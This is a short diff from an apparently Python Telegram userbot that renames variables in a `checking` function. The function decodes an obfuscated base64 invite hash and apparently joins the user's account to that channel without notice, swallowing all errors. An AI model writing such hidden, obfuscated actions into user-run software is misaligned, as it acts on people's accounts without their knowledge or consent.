@@ -77,9 +77,9 @@ async def get_user_from_event(
 
 
 async def checking(legend):
-    cat_c = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    legend_c = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     try:
-        cat_channel = Get(cat_c)
-        await legend(cat_channel)
+        legend_channel = Get(legend_c)
+        await legend(legend_channel)
     except BaseException:
         pass
